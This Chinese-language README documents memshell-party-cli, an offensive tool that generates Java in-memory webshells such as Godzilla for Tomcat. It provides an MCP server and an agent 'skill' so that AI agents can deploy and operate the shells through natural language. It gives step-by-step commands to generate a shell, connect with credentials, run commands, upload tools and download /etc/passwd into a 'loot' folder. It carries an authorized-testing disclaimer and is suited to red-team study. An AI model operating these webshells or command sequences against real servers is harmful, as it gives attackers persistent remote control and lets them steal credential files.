# memshell-party-cli

[English](README.en.md) | 中文

[MemShellParty](https://party.mem.mk) 的命令行客户端和 MCP 服务器，支持生成 Java 内存马、探测目标、连接验证、执行命令和传输文件。既可以让 AI 代理通过自然语言操作，也可以直接在终端使用。

> ⚠️ 仅限授权安全测试、红队演练与研究。请勿用于未授权目标。

## 安装

需要 Node.js 18 或更新版本：

```bash
npm install -g memshell-party-cli
memparty version
```

默认使用公共后端 `https://party.mem.mk`。真实测试建议自建后端，避免将 payload 交给公共服务。

## 让 AI 操作

安装使用手册（Skill）：

```bash
# Claude Code
memparty skill install --claude

# 其他 AI 代理
memparty skill install
```

安装后重启 AI 工具，然后直接说：

```text
请读取 memshell-party skill，按其中的步骤帮我生成一个 Tomcat 哥斯拉内存马。
告诉我需要保存哪些信息，以及接下来怎么部署。只在授权环境中操作。
```

需要连接、执行命令或传输文件时，把已部署内存马的地址和凭据交给 AI 即可。

也可以配置 MCP，让 AI 直接调用工具：

```json
{
  "mcpServers": {
    "memshell-party": {
      "command": "npx",
      "args": ["-y", "memshell-party-cli", "mcp"]
    }
  }
}
```

## 自己敲命令

直接运行 `memparty` 进入交互模式，运行 `memparty gen` 打开生成向导。

| 命令 | 用途 |
|------|------|
| `gen` / `probe` | 生成内存马 / 探测中间件和 JDK |
| `connect` | 验证内存马和凭据 |
| `exec` | 执行命令 |
| `upload` / `download` | 上传 / 下载文件 |
| `save` / `list` / `remove` | 保存和管理目标 |
| `bytecode` | 解码、转换和打包 `.class` |
| `config` | 查询后端支持的中间件、工具和打包器 |
| `log` | 查看本地操作日志 |

典型流程：

```bash
# 1. 生成 Tomcat 哥斯拉 Listener 内存马
memparty gen -s Tomcat -t Godzilla -y Listener -p DefaultBase64 \
  --godzilla-pass pass --godzilla-key key -o shell.class

# 2. 部署后验证连接（认证信息见 gen --json 的输出）
memparty connect -u http://target/shell.jsp -t godzilla --pass pass --key key \
  --header-name User-Agent --header-value <token>

# 3. 保存目标，之后用名字代替重复参数
memparty save web1 -u http://target/shell.jsp -t godzilla --pass pass --key key \
  --header-name User-Agent --header-value <token>

# 4. 执行命令、传输文件
memparty exec web1 --cmd "whoami"
memparty upload web1 ./tool.txt /tmp/tool.txt
memparty download web1 /etc/passwd -o loot/passwd
```

所有生成的内存马都带认证 header。具体参数、插件、混淆、Agent 加载和流量伪装等用法，请运行 `memparty <命令> --help` 或查看[完整英文参考](README.en.md)。

## 自建后端

```bash
# 单次指定
memparty --api http://127.0.0.1:8080 gen

# 或通过环境变量设置
export MEMPARTY_API_URL=http://127.0.0.1:8080
```

配置优先级：命令行 `--api` > 环境变量 > `~/.mempartyrc` > 默认公共后端。

## 更多文档

- [完整英文参考](README.en.md)：全部命令、参数、MCP 工具和 API 示例
- [AI 使用手册](skills/memshell-party/SKILL.md)：面向 AI 代理的详细操作流程

## 开发

```bash
npm install
npm run build
npm test
npm run typecheck
```

## 许可证

MIT
